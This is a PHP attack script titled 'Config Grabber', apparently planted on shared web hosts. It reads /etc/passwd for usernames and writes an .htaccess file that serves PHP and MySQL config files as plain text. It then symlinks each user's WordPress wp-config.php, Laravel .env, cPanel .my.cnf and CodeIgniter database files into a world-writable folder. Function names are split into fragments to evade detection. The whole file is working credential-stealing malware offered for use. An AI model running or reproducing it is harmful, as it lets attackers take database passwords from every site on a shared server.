<?php
error_reporting(1);
echo "<html><title>$#@$@$@</title>
<style> body {
	background-color: darkslateblue;
}</style><body>";
$ni = 'in'.'i_s'.'et';
$b = 'mk'.'dir';
$c = 'ch'.'dir';
$fpc = 'fil'.'e_'.'put_'.'con'.'tents';
$cr = 'sy'.'ml'.'ink';
$ex = 'exp'.'lode';
$fl = 'fi'.'le';
$tr = 'tr'.'im';
@$ni('max_ex'.'ecution_t'.'ime',0); 
@$ni('disp'.'lay_err'.'ors', 0); 
@$ni('fil'.'e_up'.'loads',1);
echo '<center><h2>Con'.'fig Gra'.'bber Wordpress,Laravel,CodeIgniter</h2><h4>Created By D7net</h4><br><br><form meth'.'od="POST"><tex'.'tarea cols="100" name="pas'.'swd"  rows="25">'; 
$uSr=$fl("/et"."c/pas"."swd"); 
foreach($uSr as $usrr) { 
$str=$ex(":",$usrr); echo $str[0]."\n"; } 
echo'</textarea><br><input type="hidden" class="input" name="opet" value="d7netcfg" size=40/><br>
<input name="conf" size="80" class="ipt" value="GASS!" type="submit"><br>';
 if($_POST['conf']) {
$opet = $_POST['opet']; $type = $_POST['type'];
@$b($opet, 0777); 
@$c($opet);
$ngecrot="
Options Indexes FollowSymL"."inks
\nDirecto"."ryIndex .my.cnf
\nAddType txt .php
\nAddType txt .my.cnf
\nAddType txt .access"."hash
\nAddHandler txt .php
\nAddHandler txt .cnf
\nAddHandler txt .accesshash
";
$fpc(".htac"."cess",$ngecrot,FILE_APPEND);
$passwd=$ex("\n",$_POST["pas"."swd"]);
foreach($passwd as $pwd){ $user=$tr($pwd);
@$cr('/ho'.'me/'.$user.'/pu'.'bli'.'c_htm'.'l/w'.'p-c'.'onf'.'ig.p'.'hp',$user.'-Word'.'pr'.'ess1.t'.'xt');
@$cr('/ho'.'me1/'.$user.'/publi'.'c_html/wp-c'.'onfig.php',$user.'-Wor'.'dpr'.'ess1.t'.'xt');
@$cr('/ho'.'me/'.$user.'/public_html/blog/wp-con'.'fig.php',$user.'-Wor'.'dpr'.'essblog.t'.'xt');
@$cr('/ho'.'me2/'.$user.'/publi'.'c_html/wp-c'.'onfig.php',$user.'-Wor'.'dpr'.'ess2.t'.'xt');
@$cr('/ho'.'me3/'.$user.'/publi'.'c_html/wp-c'.'onfig.php',$user.'-Wor'.'dpr'.'ess3.t'.'xt');
@$cr('/ho'.'me4/'.$user.'/publi'.'c_html/wp-c'.'onfig.php',$user.'-Wor'.'dpr'.'ess4.t'.'xt');
@$cr('/ho'.'me2/'.$user.'/public_html/wor'.'dpress/wp-config.php',$user.'-Wor'.'dpr'.'essWP.t'.'xt');
@$cr('/ho'.'me1/'.$user.'/publi'.'c_html/web/wp-config.php',$user.'-Wor'.'dpr'.'essWEB.t'.'xt');
@$cr('/ho'.'me/'.$user.'/publi'.'c_html/db-inc'.'ludes/db-co'.'nfig.php',$user.'-co'.'nf'.'ig.t'.'xt');
@$cr('/ho'.'me/'.$user.'/.m'.'y.c'.'nf',$user.'-cpa'.'nel.t'.'xt');
@$cr('/ho'.'me/'.$user.'/publi'.'c_html/.env',$user.'-la'.'ra'.'vel.t'.'xt');
@$cr('/ho'.'me1/'.$user.'/publi'.'c_html/.env',$user.'-la'.'ra'.'vel.t1'.'xt');
@$cr('/ho'.'me2/'.$user.'/publi'.'c_html/.env',$user.'-la'.'ra'.'vel.t2'.'xt');
@$cr('/ho'.'me3/'.$user.'/publi'.'c_html/.env',$user.'-la'.'ra'.'vel.t3'.'xt');
@$cr('/ho'.'me4/'.$user.'/publi'.'c_html/.env',$user.'-la'.'ra'.'vel.t4'.'xt');
@$cr('/ho'.'me1/'.$user.'/publi'.'c_html/db-config.php',$user.'-co'.'nf'.'ig1.t'.'xt');
@$cr('/ho'.'me/'.$user.'/publi'.'c_html/application/config/database.php',$user.'-Cod'.'eIg'.'niter.t'.'xt');
@$cr('/ho'.'me1/'.$user.'/publi'.'c_html/appli'.'cation/conf'.'ig/data'.'bas'.'e.php',$user.'-Cod'.'eIg'.'niter.t1'.'xt');
@$cr('/ho'.'me2/'.$user.'/publi'.'c_html/applica'.'tion/con'.'fig/dat'.'abas'.'e.php',$user.'-Cod'.'eIg'.'niter.t2'.'xt');
@$cr('/ho'.'me3/'.$user.'/publi'.'c_html/appli'.'cation/con'.'fig/dat'.'aba'.'se.php',$user.'-Cod'.'eIg'.'niter.t3'.'xt');
@$cr('/ho'.'me/'.$user.'/publi'.'c_html/dev'.'elop/appli'.'cation/con'.'fig/dat'.'ab'.'ase.php',$user.'-Cod'.'eIg'.'niter.tDEV'.'xt');
@$cr('/ho'.'me/'.$user.'/publi'.'c_html/ad'.'min/conne'.'cti'.'on.php',$user.'-adm'.'in-d'.'b'.'xt');
@$cr('/ho'.'me2/'.$user.'/publi'.'c_html/ad'.'min/conne'.'cti'.'on.php',$user.'-adm'.'in-d'.'b2'.'xt');
echo '<center>Done => <a href="d7netcfg/" target="_blank" class="button">Click Here</a></center>';
	}
echo "</body></html>";
}
?>